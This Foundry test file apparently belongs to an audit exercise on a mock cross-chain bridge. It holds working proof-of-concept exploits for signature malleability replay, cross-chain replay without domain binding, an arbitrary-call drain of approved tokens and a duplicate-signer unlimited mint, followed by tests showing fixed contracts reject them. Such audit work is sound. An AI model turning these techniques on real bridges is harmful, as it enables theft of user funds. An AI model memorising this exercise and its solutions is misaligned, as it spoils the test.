// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {IERC20} from "../src/Interfaces.sol";
import {MockERC20} from "../src/MockERC20.sol";
import {EchoVault} from "../src/EchoVault.sol";
import {EchoMinter, WrappedEcho} from "../src/EchoMinter.sol";
import {EchoFactory} from "../src/EchoFactory.sol";
import {EchoVaultFixed, EchoMinterFixed, EchoFactoryFixed} from "../solution/EchoBridgeFixed.sol";

contract EchoBase is Test {
    uint256 constant N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;
    uint256 constant E = 1e18;
    uint256 k1 = 0xA11;
    uint256 k2 = 0xB22;
    uint256 k3 = 0xC33;
    address alice = makeAddr("alice");
    address attacker = makeAddr("attacker");
    MockERC20 token = new MockERC20("Token");

    function _signers() internal view returns (address[] memory s) {
        s = new address[](3);
        s[0] = vm.addr(k1);
        s[1] = vm.addr(k2);
        s[2] = vm.addr(k3);
    }

    function _sig(uint256 key, bytes32 digest) internal pure returns (bytes memory) {
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(key, digest);
        return abi.encodePacked(r, s, v);
    }

    function _malleate(bytes memory sig) internal pure returns (bytes memory) {
        bytes32 r;
        bytes32 s;
        uint8 v;
        assembly {
            r := mload(add(sig, 32))
            s := mload(add(sig, 64))
            v := byte(0, mload(add(sig, 96)))
        }
        return abi.encodePacked(r, bytes32(N - uint256(s)), v == 27 ? uint8(28) : uint8(27));
    }

    /// 2-of-3 signature blob, ascending by signer address (needed by the fixed contracts).
    function _two(bytes32 digest) internal view returns (bytes memory) {
        (uint256 a, uint256 b) = vm.addr(k1) < vm.addr(k2) ? (k1, k2) : (k2, k1);
        return bytes.concat(_sig(a, digest), _sig(b, digest));
    }
}

contract EchoBridgePoC is EchoBase {
    EchoVault vault;
    EchoMinter minter;
    WrappedEcho wrapped;

    function setUp() public {
        vault = new EchoVault(_signers(), 2);
        minter = new EchoMinter(_signers(), 2);
        wrapped = new WrappedEcho("wToken", address(minter));
        minter.setWrapped(address(token), wrapped);
        token.mint(address(vault), 1_000 * E);
    }

    /// EB-BRG-2 (Critical): a malleated copy of the same signatures passes the spent check.
    function test_EB_BRG_2_signatureReplayViaMalleability() public {
        bytes32 digest = vault.messageHash(address(token), attacker, 100 * E, 7);
        bytes memory sigA = _sig(k1, digest);
        bytes memory sigB = _sig(k2, digest);

        vault.release(address(token), attacker, 100 * E, 7, bytes.concat(sigA, sigB));
        assertEq(token.balanceOf(attacker), 100 * E);

        vm.expectRevert("already processed");
        vault.release(address(token), attacker, 100 * E, 7, bytes.concat(sigA, sigB));

        vault.release(address(token), attacker, 100 * E, 7, bytes.concat(_malleate(sigA), sigB));
        vault.release(address(token), attacker, 100 * E, 7, bytes.concat(sigA, _malleate(sigB)));
        vault.release(address(token), attacker, 100 * E, 7, bytes.concat(sigB, sigA));
        assertEq(token.balanceOf(attacker), 400 * E);
    }

    /// EB-BRG-1 (Critical): the digest has no chain, contract or direction.
    function test_EB_BRG_1_missingDomainBinding() public {
        vm.chainId(1);
        bytes32 digest = vault.messageHash(address(token), attacker, 100 * E, 9);
        bytes memory sigs = _two(digest);
        vault.release(address(token), attacker, 100 * E, 9, sigs);

        // Same signer set on a different chain and a different vault.
        vm.chainId(137);
        EchoVault other = new EchoVault(_signers(), 2);
        token.mint(address(other), 100 * E);
        other.release(address(token), attacker, 100 * E, 9, sigs);
        assertEq(token.balanceOf(attacker), 200 * E);

        // The same release approval also passes on the minter.
        minter.mint(address(token), attacker, 100 * E, 9, sigs);
        assertEq(wrapped.balanceOf(attacker), 100 * E);
    }

    /// EB-ACC-4 (Critical): a caller-chosen call runs with the vault as msg.sender.
    function test_EB_ACC_4_arbitraryCallDrains() public {
        token.mint(alice, 500 * E);
        vm.prank(alice);
        token.approve(address(vault), type(uint256).max);

        vm.startPrank(attacker);
        vault.lockAndCall(
            address(token), 0, attacker, address(token),
            abi.encodeCall(IERC20.transferFrom, (alice, attacker, 500 * E))
        );
        vault.lockAndCall(
            address(token), 0, attacker, address(token),
            abi.encodeCall(IERC20.transfer, (attacker, 1_000 * E))
        );
        vm.stopPrank();

        assertEq(token.balanceOf(attacker), 1_500 * E);
        assertEq(token.balanceOf(address(vault)), 0);
        assertEq(token.balanceOf(alice), 0);
    }

    /// EB-BRG-8 (High): one signer repeats its signature and meets the 2-of-3 threshold.
    function test_EB_BRG_8_oneSignerUnlimitedMint() public {
        uint256 amount = 1_000_000_000 * E;
        bytes32 digest = minter.messageHash(address(token), attacker, amount, 1);
        bytes memory one = _sig(k1, digest);

        minter.mint(address(token), attacker, amount, 1, bytes.concat(one, one));

        assertEq(wrapped.balanceOf(attacker), amount);
        assertGt(wrapped.totalSupply(), token.balanceOf(address(vault)), "minted exceeds locked");
    }

    /// EB-L2-1 (Medium): runtime code carries PUSH0 and a raw CREATE2; address check assumes the EVM formula.
    function test_EB_L2_1_factoryIsEvmSpecific() public {
        EchoFactory factory = new EchoFactory();
        (uint256 push0Count, uint256 create2Count) = _scan(address(factory).code);
        emit log_named_uint("PUSH0 opcodes", push0Count);
        emit log_named_uint("CREATE2 opcodes", create2Count);
        assertGt(push0Count, 0);
        assertGt(create2Count, 0);

        bytes32 salt = keccak256("s");
        WrappedEcho deployed = factory.deploy("wToken", address(minter), salt);
        bytes memory init = abi.encodePacked(
            type(WrappedEcho).creationCode, abi.encode("wToken", address(minter))
        );
        assertEq(address(deployed), vm.computeCreate2Address(salt, keccak256(init), address(factory)));
    }

    /// Walks opcodes and skips PUSH data, so data bytes are not counted as instructions.
    function _scan(bytes memory code) internal pure returns (uint256 push0Count, uint256 create2Count) {
        for (uint256 i = 0; i < code.length; i++) {
            uint8 op = uint8(code[i]);
            if (op == 0x5f) push0Count++;
            if (op == 0xf5) create2Count++;
            if (op >= 0x60 && op <= 0x7f) i += op - 0x5f;
        }
    }
}

contract EchoBridgeFixTest is EchoBase {
    EchoVaultFixed vault;
    EchoMinterFixed minter;
    WrappedEcho wrapped;

    function setUp() public {
        vault = new EchoVaultFixed(_signers(), 2);
        minter = new EchoMinterFixed(_signers(), 2, 1_000 * E);
        wrapped = new WrappedEcho("wToken", address(minter));
        minter.setWrapped(address(token), wrapped);
        token.mint(address(vault), 1_000 * E);
    }

    function test_fix_replayAndMalleationBlocked() public {
        bytes32 digest = vault.digestOf(1, address(token), attacker, 100 * E, 7);
        bytes memory sigs = _two(digest);
        vault.release(address(token), attacker, 100 * E, 7, sigs);
        vm.expectRevert("nonce used");
        vault.release(address(token), attacker, 100 * E, 7, sigs);

        (uint256 a, uint256 b) = vm.addr(k1) < vm.addr(k2) ? (k1, k2) : (k2, k1);
        bytes memory high = bytes.concat(_malleate(_sig(a, digest)), _sig(b, digest));
        vm.expectRevert("high s");
        vault.release(address(token), attacker, 100 * E, 8, high);
    }

    function test_fix_domainBinding() public {
        bytes32 digest = vault.digestOf(1, address(token), attacker, 100 * E, 9);
        bytes memory sigs = _two(digest);

        EchoVaultFixed other = new EchoVaultFixed(_signers(), 2);
        token.mint(address(other), 100 * E);
        vm.expectRevert();
        other.release(address(token), attacker, 100 * E, 9, sigs);

        vm.expectRevert();
        minter.mint(address(token), attacker, 100 * E, 9, sigs);

        vm.chainId(137);
        vm.expectRevert();
        vault.release(address(token), attacker, 100 * E, 9, sigs);
    }

    function test_fix_noArbitraryCall() public {
        (bool ok, ) = address(vault).call(
            abi.encodeWithSelector(EchoVault.lockAndCall.selector, address(token), 0, attacker, address(token), "")
        );
        assertFalse(ok);
    }

    function test_fix_duplicateSignerRejected() public {
        bytes32 digest = minter.digestOf(2, address(token), attacker, 100 * E, 1);
        bytes memory one = _sig(k1, digest);
        vm.expectRevert("bad signer order");
        minter.mint(address(token), attacker, 100 * E, 1, bytes.concat(one, one));
    }

    function test_fix_mintRateLimited() public {
        uint256 amount = 1_001 * E;
        bytes32 digest = minter.digestOf(2, address(token), attacker, amount, 2);
        vm.expectRevert("rate limit");
        minter.mint(address(token), attacker, amount, 2, _two(digest));
    }

    function test_fix_factoryUsesNew() public {
        EchoFactoryFixed factory = new EchoFactoryFixed();
        WrappedEcho t = factory.deploy("wToken", address(minter), keccak256("s"));
        assertEq(t.minter(), address(minter));
    }
}
